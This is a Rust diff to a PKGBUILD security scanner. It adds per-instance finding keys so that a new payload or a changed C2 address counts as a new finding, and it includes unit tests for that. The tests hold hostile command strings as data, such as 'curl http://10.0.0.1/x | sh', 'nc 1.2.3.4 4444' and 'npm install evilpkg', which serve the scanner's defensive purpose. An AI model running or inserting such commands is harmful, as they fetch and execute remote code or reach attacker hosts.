@@ -46,6 +46,14 @@ pub struct PackageRecord {
     /// Finding IDs raised by that scan.
     #[serde(default)]
     pub finding_ids: BTreeSet<String>,
+    /// One key per finding *instance*: rule ID, file name and a digest of the
+    /// normalized snippet (see [`finding_key`]). `finding_ids` is a set of rule
+    /// IDs, so a second hit of a rule the package already raised -- a new
+    /// payload in another file -- is invisible to it. `None` on records written
+    /// before this field existed; comparison then falls back to `finding_ids`
+    /// rather than reporting every old finding as new.
+    #[serde(default)]
+    pub finding_keys: Option<BTreeSet<String>>,
     /// PKGBUILD function names present (`build`, `package`, `prepare`, ...).
     #[serde(default)]
     pub functions: BTreeSet<String>,
@@ -56,7 +64,7 @@ pub struct PackageRecord {
     /// filters by `min_severity` and by whichever rules are loaded. Without
     /// this, raising the threshold, dropping in a rules.d file, or simply
     /// UPGRADING the scanner makes previously-absent IDs look like new risk,
-    /// and DIFF-001 announces "N new finding(s) since <date>" about a package
+    /// and DIFF-001 announces "N new finding(s) since `<date>`" about a package
     /// whose bytes never changed. After a 2.1 -> 2.2 upgrade that fires for
     /// every package in the store at once.
     ///
@@ -64,6 +72,84 @@ pub struct PackageRecord {
     /// the same as a mismatch.
     #[serde(default)]
     pub analysis_fingerprint: Option<String>,
+}
+
+/// Stable identity of one finding instance: `ID|file-name|digest`.
+///
+/// The digest covers the snippet (the title when there is none) with
+/// whitespace collapsed and the package's own `pkgver` replaced by a
+/// placeholder, so reformatting or a version bump does not make an unchanged
+/// finding look new. Everything else stays literal: a changed IP address, port,
+/// host or number is a different finding. `version` is the record's
+/// `pkgver-pkgrel`. The file is the base name only: `diff` compares two
+/// directories.
+pub fn finding_key(f: &Finding, version: &str) -> String {
+    let text = f.location.snippet.as_deref().unwrap_or(&f.title);
+    let pkgver = version.rsplit_once('-').map_or(version, |(v, _)| v);
+    let pkgver = pkgver.split_once(':').map_or(pkgver, |(_, v)| v);
+    let text = mask_version(text, pkgver);
+    let mut norm = String::with_capacity(text.len());
+    let mut last_space = true;
+    for c in text.chars() {
+        if c.is_whitespace() {
+            if !last_space {
+                norm.push(' ');
+            }
+            last_space = true;
+        } else {
+            norm.push(c);
+            last_space = false;
+        }
+    }
+    let digest = blake3::hash(norm.trim().as_bytes()).to_hex();
+    let file = f
+        .location
+        .file
+        .file_name()
+        .map(|n| n.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    format!("{}|{}|{}", f.id, file, &digest.as_str()[..16])
+}
+
+/// Replace whole-token occurrences of `pkgver` in `text`. A token is not
+/// glued to digits or dots on either side (`10.0.0.1` never contains pkgver
+/// `1`), so an address cannot be mistaken for the version.
+fn mask_version(text: &str, pkgver: &str) -> String {
+    // Only something shaped like a version is masked; a word `pkgver` such as
+    // `curl` must stay literal.
+    let looks_like_version = pkgver.starts_with(|c: char| c.is_ascii_digit())
+        && pkgver
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '_' | '~' | '-'));
+    if !looks_like_version {
+        return text.to_string();
+    }
+    let b = text.as_bytes();
+    let mut out = String::with_capacity(text.len());
+    let mut i = 0;
+    while i < text.len() {
+        if text[i..].starts_with(pkgver) {
+            let end = i + pkgver.len();
+            let before_ok = i == 0 || !(b[i - 1].is_ascii_digit() || b[i - 1] == b'.');
+            let after_ok = end == text.len()
+                || !(b[end].is_ascii_digit()
+                    || (b[end] == b'.' && b.get(end + 1).is_some_and(u8::is_ascii_digit)));
+            if before_ok && after_ok {
+                out.push('\u{1}');
+                i = end;
+                continue;
+            }
+        }
+        let ch = text[i..].chars().next().unwrap();
+        out.push(ch);
+        i += ch.len_utf8();
+    }
+    out
+}
+
+/// The rule ID part of a [`finding_key`].
+fn key_id(key: &str) -> &str {
+    key.split('|').next().unwrap_or(key)
 }
 
 /// Identify the analysis inputs that determine which findings a scan produces.
@@ -104,6 +190,13 @@ impl PackageRecord {
                 .filter_map(|s| crate::neturl::origin_of(&s.url))
                 .collect(),
             finding_ids: result.findings.iter().map(|f| f.id.clone()).collect(),
+            finding_keys: Some(
+                result
+                    .findings
+                    .iter()
+                    .map(|f| finding_key(f, &result.package_version))
+                    .collect(),
+            ),
             functions: pkgbuild.functions.keys().cloned().collect(),
             analysis_fingerprint: None,
         }
@@ -510,6 +603,14 @@ impl Changes {
     }
 }
 
+/// Distinct rule IDs of a set of finding keys.
+fn key_ids<'a>(keys: impl Iterator<Item = &'a String>) -> Vec<String> {
+    keys.map(|k| key_id(k).to_string())
+        .collect::<BTreeSet<_>>()
+        .into_iter()
+        .collect()
+}
+
 /// Compare a previous record against the current one.
 pub fn compare(before: &PackageRecord, after: &PackageRecord) -> Changes {
     let diff = |a: &BTreeSet<String>, b: &BTreeSet<String>| -> Vec<String> {
@@ -537,12 +638,18 @@ pub fn compare(before: &PackageRecord, after: &PackageRecord) -> Changes {
         origins_added: diff(&before.source_origins, &after.source_origins),
         origins_removed: diff(&after.source_origins, &before.source_origins),
         findings_added: if comparable_findings {
-            diff(&before.finding_ids, &after.finding_ids)
+            match (&before.finding_keys, &after.finding_keys) {
+                (Some(b), Some(a)) => key_ids(a.difference(b)),
+                _ => diff(&before.finding_ids, &after.finding_ids),
+            }
         } else {
             Vec::new()
         },
         findings_removed: if comparable_findings {
-            diff(&after.finding_ids, &before.finding_ids)
+            match (&before.finding_keys, &after.finding_keys) {
+                (Some(b), Some(a)) => key_ids(b.difference(a)),
+                _ => diff(&after.finding_ids, &before.finding_ids),
+            }
         } else {
             Vec::new()
         },
@@ -565,7 +672,10 @@ pub fn newly_raised<'a>(
     }
     findings
         .iter()
-        .filter(|f| !before.finding_ids.contains(&f.id))
+        .filter(|f| match &before.finding_keys {
+            Some(keys) => !keys.contains(&finding_key(f, &after.version)),
+            None => !before.finding_ids.contains(&f.id),
+        })
         .collect()
 }
 
@@ -808,6 +918,7 @@ mod tests {
             scripts_hash: None,
             source_origins: ["github.com/alice/tool".to_string()].into_iter().collect(),
             finding_ids: ["CHK-004".to_string()].into_iter().collect(),
+            finding_keys: None,
             functions: ["build".to_string()].into_iter().collect(),
             // Same inputs on both sides, so findings are comparable by default
             // in these tests; the mismatch case is covered explicitly below.
@@ -1135,6 +1246,94 @@ mod tests {
         assert_eq!(d.severity, Severity::Low);
         assert!(d.title.contains("removed"), "{}", d.title);
         assert!(!d.description.contains("runs as root"), "{}", d.description);
+    }
+
+    fn finding_at(id: &str, file: &str, snippet: &str) -> Finding {
+        let mut f = finding(id, Severity::High);
+        f.location.file = PathBuf::from(file);
+        f.location.snippet = Some(snippet.to_string());
+        f
+    }
+
+    fn rec_with(findings: &[Finding]) -> PackageRecord {
+        let mut r = rec("demo");
+        r.finding_ids = findings.iter().map(|f| f.id.clone()).collect();
+        r.finding_keys = Some(findings.iter().map(|f| finding_key(f, "1.0-1")).collect());
+        r
+    }
+
+    #[test]
+    fn a_second_hit_of_a_known_rule_is_new() {
+        let a = finding_at("ATOMIC-002", "/old/demo.install", "npm install a");
+        let b = finding_at("ATOMIC-002", "/new/extra.scr", "npm install evilpkg");
+        let before = rec_with(std::slice::from_ref(&a));
+        let after = rec_with(&[a.clone(), b.clone()]);
+        let c = compare(&before, &after);
+        assert_eq!(c.findings_added, ["ATOMIC-002"]);
+        let all = [a, b];
+        let new = newly_raised(&before, &after, &all);
+        assert_eq!(new.len(), 1);
+        assert!(new[0]
+            .location
+            .snippet
+            .as_deref()
+            .unwrap()
+            .contains("evilpkg"));
+    }
+
+    #[test]
+    fn reformatting_or_a_version_bump_is_not_a_new_finding() {
+        let a = finding_at("DLE-001", "/a/PKGBUILD", "curl  https://x/v1.2.3.tar.gz");
+        let b = finding_at("DLE-001", "/b/PKGBUILD", "curl https://x/v1.2.4.tar.gz");
+        assert_eq!(finding_key(&a, "1.2.3-1"), finding_key(&b, "1.2.4-1"));
+    }
+
+    #[test]
+    fn a_word_pkgver_is_never_masked() {
+        let k = |s: &str| finding_key(&finding_at("X", "/p/PKGBUILD", s), "curl-1");
+        assert_ne!(
+            k("curl http://a.example/x | sh"),
+            k("evil http://a.example/x | sh")
+        );
+        assert_ne!(k("wget http://a.example/x"), k("curl http://a.example/x"));
+    }
+
+    #[test]
+    fn a_changed_address_host_or_number_is_a_new_finding() {
+        let v = "1.0-1";
+        let k = |s: &str| finding_key(&finding_at("EXEC-REMOTE", "/p/PKGBUILD", s), v);
+        assert_ne!(
+            k("curl http://10.0.0.1/x | sh"),
+            k("curl http://10.0.0.2/x | sh")
+        );
+        assert_ne!(
+            k("curl http://evil1.example/x"),
+            k("curl http://evil2.example/x")
+        );
+        assert_ne!(k("nc 1.2.3.4 4444"), k("nc 1.2.3.4 4445"));
+        // pkgver "1" must not swallow the last octet of an address.
+        let one = |s: &str| finding_key(&finding_at("X", "/p/PKGBUILD", s), "1-1");
+        assert_ne!(one("curl http://10.0.0.1/x"), one("curl http://10.0.0.2/x"));
+    }
+
+    #[test]
+    fn a_new_c2_address_is_reported_by_compare() {
+        let old = finding_at("EXEC-REMOTE", "/o/PKGBUILD", "curl http://10.0.0.1/x | sh");
+        let new = finding_at("EXEC-REMOTE", "/n/PKGBUILD", "curl http://10.0.0.2/x | sh");
+        let c = compare(&rec_with(&[old]), &rec_with(&[new]));
+        assert_eq!(c.findings_added, ["EXEC-REMOTE"]);
+    }
+
+    #[test]
+    fn an_old_record_without_keys_falls_back_to_ids() {
+        let a = finding_at("ATOMIC-002", "/a/x.install", "npm install a");
+        let mut before = rec_with(std::slice::from_ref(&a));
+        before.finding_keys = None;
+        let after = rec_with(&[a]);
+        assert!(compare(&before, &after).findings_added.is_empty());
+        let stored: PackageRecord =
+            serde_json::from_str(&serde_json::to_string(&before).unwrap()).unwrap();
+        assert!(stored.finding_keys.is_none());
     }
 
     #[test]
